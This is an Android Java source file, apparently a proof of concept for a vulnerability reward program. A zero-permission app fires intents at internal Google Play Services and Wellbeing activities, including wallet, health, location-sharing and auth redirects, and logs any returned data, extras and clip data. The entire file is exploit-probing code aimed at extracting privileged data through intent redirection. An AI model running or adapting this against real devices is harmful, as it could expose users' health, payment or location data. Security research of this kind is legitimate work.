package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class IntentRedirectActivity extends Activity {
    private static final String T = "REDIRECT";
    private static final int RC_WELLBEING = 2001;
    private static final int RC_UNPACK = 2002;
    private static final int RC_HEALTH = 2003;
    private static final int RC_WALLET_REDIRECT = 2004;
    private static final int RC_LOCATION_SHARE = 2005;

    private int testIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== INTENT REDIRECT / TRAMPOLINE PoC ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());
        runNextTest();
    }

    private void runNextTest() {
        testIndex++;
        switch (testIndex) {
            case 1: testWellbeingAccess(); break;
            case 2: testWellbeingWithdraw(); break;
            case 3: testUnpackingRedirect(); break;
            case 4: testHealthTrampoline(); break;
            case 5: testWalletRedirect(); break;
            case 6: testLocationSharing(); break;
            default:
                Log.w(T, "=== ALL REDIRECT TESTS COMPLETE ===");
                finish();
                break;
        }
    }

    private void testWellbeingAccess() {
        Log.w(T, "--- Testing Wellbeing REQUEST_ACCESS via startActivityForResult ---");
        try {
            Intent intent = new Intent("com.google.android.apps.wellbeing.action.REQUEST_ACCESS");
            intent.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.datamanagement.accessrequest.ExternalAccessRequestActivity"));
            intent.putExtra("requesting_package", getPackageName());
            startActivityForResult(intent, RC_WELLBEING);
        } catch (Exception e) {
            Log.e(T, "Wellbeing REQUEST_ACCESS failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testWellbeingWithdraw() {
        Log.w(T, "--- Testing Wellbeing WITHDRAW_ACCESS ---");
        try {
            Intent intent = new Intent("com.google.android.apps.wellbeing.action.WITHDRAW_ACCESS");
            intent.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.datamanagement.accessrequest.ExternalAccessRequestActivity"));
            startActivityForResult(intent, RC_WELLBEING + 10);
        } catch (Exception e) {
            Log.e(T, "Wellbeing WITHDRAW_ACCESS failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testUnpackingRedirect() {
        Log.w(T, "--- Testing GMS UnpackingRedirectActivity ---");
        try {
            Intent intent = new Intent("com.google.android.gms.ui.UNPACKING_REDIRECT");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.uiflows.common.UnpackingRedirectActivity"));
            intent.setData(Uri.parse("intent://com.google.android.gms.auth.uiflows.common/redirect"));
            startActivityForResult(intent, RC_UNPACK);
        } catch (Exception e) {
            Log.e(T, "UnpackingRedirect failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testHealthTrampoline() {
        Log.w(T, "--- Testing GMS HealthDataProviders TrampolineActivity ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.healthdataproviders.ui.TrampolineActivity"));
            startActivityForResult(intent, RC_HEALTH);
        } catch (Exception e) {
            Log.e(T, "HealthTrampoline failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testWalletRedirect() {
        Log.w(T, "--- Testing GMS Wallet FinishAndroidAppRedirectProxyActivity ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.wallet.redirect.FinishAndroidAppRedirectProxyActivity"));
            intent.setData(Uri.parse("https://pay.google.com/test"));
            startActivityForResult(intent, RC_WALLET_REDIRECT);
        } catch (Exception e) {
            Log.e(T, "WalletRedirect failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testLocationSharing() {
        Log.w(T, "--- Testing GMS LocationSharingRedirectActivity ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.locationsharing.activity.LocationSharingRedirectActivity"));
            intent.setData(Uri.parse("https://maps.google.com/locationsharing/share"));
            startActivityForResult(intent, RC_LOCATION_SHARE);
        } catch (Exception e) {
            Log.e(T, "LocationSharingRedirect failed: " + e.getMessage());
            runNextTest();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String target = "TEST_" + requestCode;
        switch (requestCode) {
            case RC_WELLBEING: target = "Wellbeing_REQUEST_ACCESS"; break;
            case RC_WELLBEING + 10: target = "Wellbeing_WITHDRAW_ACCESS"; break;
            case RC_UNPACK: target = "UnpackingRedirect"; break;
            case RC_HEALTH: target = "HealthTrampoline"; break;
            case RC_WALLET_REDIRECT: target = "WalletRedirect"; break;
            case RC_LOCATION_SHARE: target = "LocationSharingRedirect"; break;
        }

        Log.w(T, "=== RESULT FROM " + target + " ===");
        Log.w(T, "resultCode=" + resultCode);

        if (data != null) {
            Log.w(T, "*** DATA RETURNED ***");
            Log.w(T, "action=" + data.getAction());
            Log.w(T, "data=" + data.getData());
            Log.w(T, "type=" + data.getType());
            Log.w(T, "component=" + data.getComponent());

            Bundle extras = data.getExtras();
            if (extras != null) {
                Log.w(T, "*** EXTRAS (count=" + extras.size() + ") ***");
                for (String key : extras.keySet()) {
                    Object val = extras.get(key);
                    if (val != null) {
                        String valStr = val.toString();
                        Log.w(T, "  KEY=" + key + " TYPE=" + val.getClass().getSimpleName()
                            + " VAL=" + valStr.substring(0, Math.min(300, valStr.length())));
                    }
                }
            }

            if (data.getClipData() != null) {
                Log.w(T, "*** CLIP DATA ***");
                for (int i = 0; i < data.getClipData().getItemCount(); i++) {
                    Log.w(T, "  CLIP[" + i + "] uri=" + data.getClipData().getItemAt(i).getUri()
                        + " text=" + data.getClipData().getItemAt(i).getText());
                }
            }
        } else {
            Log.w(T, "No data returned");
        }

        runNextTest();
    }
}
